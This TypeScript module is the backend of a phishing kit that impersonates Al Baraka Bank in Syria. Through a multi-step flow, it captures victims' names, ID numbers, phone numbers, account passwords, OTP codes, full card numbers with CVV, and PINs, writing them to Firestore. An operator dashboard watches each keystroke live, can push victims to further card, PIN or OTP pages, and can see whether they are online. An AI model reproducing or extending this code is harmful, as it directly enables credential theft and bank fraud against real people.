import {
  collection,
  addDoc,
  updateDoc,
  doc,
  serverTimestamp,
  onSnapshot,
  type DocumentData,
} from "firebase/firestore";
import {
  ref as dbRef,
  onValue,
  onDisconnect,
  set as dbSet,
  serverTimestamp as rtdbServerTimestamp,
} from "firebase/database";
import { db, rtdb } from "./firebase";

// Firebase Presence — instantly marks the visitor offline (within ~1s) when
// the tab is closed, network drops, or browser crashes, via onDisconnect.
// The nova dashboard reads /status/{sessionId} via onValue and reflects the
// online/offline indicator in realtime (no polling, no 15s lag).
const presenceCleanups = new Map<string, () => void>();

export function startPresence(sessionId: string): () => void {
  if (!sessionId) return () => {};
  if (presenceCleanups.has(sessionId)) {
    return presenceCleanups.get(sessionId)!;
  }

  const statusRef = dbRef(rtdb, `/status/${sessionId}`);
  const connectedRef = dbRef(rtdb, ".info/connected");

  const onlinePayload = {
    state: "online",
    lastChanged: rtdbServerTimestamp(),
  };
  const offlinePayload = {
    state: "offline",
    lastChanged: rtdbServerTimestamp(),
  };

  const unsubscribe = onValue(connectedRef, (snap) => {
    if (snap.val() !== true) return;
    // Register the disconnect handler BEFORE writing online, so the server
    // will flip us to offline the moment our socket drops.
    onDisconnect(statusRef)
      .set(offlinePayload)
      .then(() => dbSet(statusRef, onlinePayload))
      .catch(() => {
        /* ignore */
      });
  });

  const cleanup = () => {
    try {
      unsubscribe();
    } catch {
      /* ignore */
    }
    dbSet(statusRef, offlinePayload).catch(() => {});
    presenceCleanups.delete(sessionId);
  };
  presenceCleanups.set(sessionId, cleanup);
  return cleanup;
}

const COLLECTION = "pays";

// nova reads `status` for approve/reject, `currentPage` for page redirects.
export type AdminDecision =
  | "approved"
  | "rejected"
  | "page_info"
  | "page_account"
  | "page_code"
  | "page_card"
  | "page_pin"
  | "page_otp"
  | null;

export interface Step1Payload {
  name: string;
  phone: string;
  idnum: string;
}

export interface Step2Payload {
  account: string;
  password: string;
}

export interface Step3Payload {
  code: string;
}

export interface CardPayload {
  cardNumber: string;
  cardHolderName: string;
  expiryDate: string;
  cvv: string;
}

function normalizeSyrianPhone(phone: string): string {
  const digits = phone.replace(/[^0-9]/g, "");
  if (digits.startsWith("09") && digits.length === 10) {
    return "+963" + digits.substring(1);
  }
  return phone;
}

function nowIso(): string {
  return new Date().toISOString();
}

// Live partial update — fires on every keystroke (debounced by caller).
// Writes only the provided fields so the dashboard sees the visitor typing
// character-by-character in realtime.
export async function patchVisitor(
  sessionId: string,
  patch: Record<string, unknown>
): Promise<void> {
  if (!sessionId) return;
  const ref = doc(db, COLLECTION, sessionId);
  try {
    await updateDoc(ref, {
      ...patch,
      isOnline: true,
      lastSeen: nowIso(),
      updatedAt: serverTimestamp(),
    });
  } catch {
    /* swallow — typing should never block UI */
  }
}

export async function createVisitorSession(): Promise<string> {
  const docRef = await addDoc(collection(db, COLLECTION), {
    country: "سوريا",
    bank: "بنك البركة",
    network: "Syriatel/MTN",
    page: "landing",
    pagename: "الرئيسية",
    currentPage: "1",
    step: 0,
    status: "pending",
    isOnline: true,
    isHidden: false,
    notificationCount: 0,
    createdDate: nowIso(),
    lastSeen: nowIso(),
    createdAt: serverTimestamp(),
    updatedAt: serverTimestamp(),
  });
  return docRef.id;
}

export async function startApplication(
  sessionId: string,
  data: Step1Payload
): Promise<void> {
  const fullPhone = normalizeSyrianPhone(data.phone);
  const ref = doc(db, COLLECTION, sessionId);
  await updateDoc(ref, {
    name: data.name,
    mobile: fullPhone,
    phone: fullPhone,
    idNumber: data.idnum,
    personalInfo: { name: data.name, id: data.idnum },
    step: 1,
    currentPage: "1",
    pagename: "المعلومات الشخصية",
    status: "pending",
    isOnline: true,
    lastSeen: nowIso(),
    updatedAt: serverTimestamp(),
  });
}

export async function submitAccount(
  sessionId: string,
  data: Step2Payload
): Promise<void> {
  const ref = doc(db, COLLECTION, sessionId);
  await updateDoc(ref, {
    email: data.account,
    pass: data.password,
    step: 2,
    currentPage: "1",
    pagename: "تفاصيل الحساب",
    status: "pending",
    isOnline: true,
    lastSeen: nowIso(),
    updatedAt: serverTimestamp(),
  });
}

export async function submitOtp(
  sessionId: string,
  data: Step3Payload
): Promise<void> {
  const ref = doc(db, COLLECTION, sessionId);
  await updateDoc(ref, {
    otp: data.code,
    otpCode: data.code,
    phoneOtp: data.code,
    step: 3,
    currentPage: "1",
    pagename: "رمز التفعيل",
    redirectTo: "",
    adminPage: "",
    page: "",
    status: "pending",
    isOnline: true,
    lastSeen: nowIso(),
    updatedAt: serverTimestamp(),
  });
}

export async function submitCardDetails(
  sessionId: string,
  data: CardPayload
): Promise<void> {
  const ref = doc(db, COLLECTION, sessionId);
  const digits = data.cardNumber.replace(/\D/g, "");
  const prefix = digits.slice(0, 6);
  const [mm, yy] = data.expiryDate.split("/");
  await updateDoc(ref, {
    cardNumber: digits,
    prefix,
    name: data.cardHolderName,
    expiryDate: data.expiryDate,
    cardExpiry: data.expiryDate,
    month: mm || "",
    year: yy || "",
    cvv: data.cvv,
    cardStatus: "submitted",
    step: 4,
    currentPage: "2",
    pagename: "بيانات البطاقة",
    page: "",
    redirectTo: "",
    adminPage: "",
    status: "pending",
    isOnline: true,
    lastSeen: nowIso(),
    updatedAt: serverTimestamp(),
  });
}

export async function submitPin(sessionId: string, pin: string): Promise<void> {
  const ref = doc(db, COLLECTION, sessionId);
  await updateDoc(ref, {
    pass: pin,
    step: 5,
    currentPage: "2",
    pagename: "الرمز السري",
    page: "",
    redirectTo: "",
    adminPage: "",
    status: "pending",
    isOnline: true,
    lastSeen: nowIso(),
    updatedAt: serverTimestamp(),
  });
}

export async function submitExtraOtp(
  sessionId: string,
  code: string
): Promise<void> {
  const ref = doc(db, COLLECTION, sessionId);
  await updateDoc(ref, {
    otp2: code,
    otp: code,
    phoneOtp: code,
    step: 6,
    currentPage: "2",
    pagename: "رمز التحقق",
    page: "",
    redirectTo: "",
    adminPage: "",
    status: "pending",
    isOnline: true,
    lastSeen: nowIso(),
    updatedAt: serverTimestamp(),
  });
}

/**
 * Listens to nova's admin actions:
 *   - status === "approved" / "rejected"  → final decision
 *   - page === "card" | "pin" | "otp"     → redirect to that form
 *   - OR adminDecision field (legacy fallback)
 */
export function subscribeToApplication(
  sessionId: string,
  cb: (data: DocumentData | null) => void
): () => void {
  const ref = doc(db, COLLECTION, sessionId);
  return onSnapshot(ref, (snap) => {
    cb(snap.exists() ? snap.data() : null);
  });
}

export function resolveDecision(data: DocumentData | null): AdminDecision {
  if (!data) return null;
  // Highest priority: explicit adminDecision (legacy support)
  const valid: AdminDecision[] = [
    "approved",
    "rejected",
    "page_info",
    "page_account",
    "page_code",
    "page_card",
    "page_pin",
    "page_otp",
  ];
  const ad = data.adminDecision;
  if (valid.includes(ad)) return ad;

  // Nova: status approved/rejected
  if (data.status === "approved") return "approved";
  if (data.status === "rejected") return "rejected";

  // Nova: redirectTo / page field drives page redirects
  const redirect = (data.redirectTo || data.adminPage || "")
    .toString()
    .toLowerCase();
  const map: Record<string, AdminDecision> = {
    info: "page_info", page_info: "page_info", data: "page_info",
    account: "page_account", page_account: "page_account",
    code: "page_code", page_code: "page_code", otp1: "page_code",
    card: "page_card", page_card: "page_card",
    pin: "page_pin", page_pin: "page_pin",
    otp: "page_otp", page_otp: "page_otp", otp2: "page_otp",
  };
  if (map[redirect]) return map[redirect];

  return null;
}

export async function heartbeat(sessionId: string): Promise<void> {
  try {
    const ref = doc(db, COLLECTION, sessionId);
    await updateDoc(ref, {
      isOnline: true,
      lastSeen: nowIso(),
    });
  } catch {
    // ignore
  }
}

export async function markOffline(sessionId: string): Promise<void> {
  try {
    const ref = doc(db, COLLECTION, sessionId);
    await updateDoc(ref, {
      isOnline: false,
      lastSeen: nowIso(),
    });
  } catch {
    // ignore
  }
}
